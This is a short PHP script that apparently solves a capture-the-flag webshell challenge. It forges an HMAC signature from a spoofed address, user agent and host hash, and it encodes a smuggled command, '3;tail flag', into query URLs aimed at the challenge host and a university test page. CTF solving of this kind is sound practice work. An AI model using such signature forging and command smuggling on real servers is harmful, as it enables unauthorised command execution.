<?php
function strToHex($string){
    $hex = '';
    for ($i=0; $i<strlen($string); $i++){
        $ord = ord($string[$i]);
        $hexCode = dechex($ord);
        $hex .= substr('0'.$hexCode, -2);
    }
    return strToUpper($hex);
}
#   $remote_addr = '140.112.30.26';
    $remote_addr = '130.211.254.158';
    $http_host = 'webshell.eof-ctf.ais3.ntu.st';
#   $http_host = 'ntucsu.csie.ntu.edu.tw';
    $user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36';
    $cmd = '3;tail flag';
    $mycmd = hash('SHA512', $remote_addr) ^ $cmd;
    $mycmd2 = strToHex($mycmd);
    $key = $user_agent . sha1($http_host);
    $sig = hash_hmac('SHA512', $cmd, $key);
?>
<code>
mycmd="<?= $mycmd ?>"<br>
mycmd2="<?= $mycmd2?>" <br>
sig="<?= $sig ?>"<br>
<br>
query:<br>
<br>
http://webshell.eof-ctf.ais3.ntu.st?cmd=<?= $mycmd ?>&sig=<?= $sig ?> <br>
https://www.csie.ntu.edu.tw/~b04902053/test_web/webshell.php?cmd=<?= $mycmd ?>&sig=<?= $sig ?> <br>
</code>
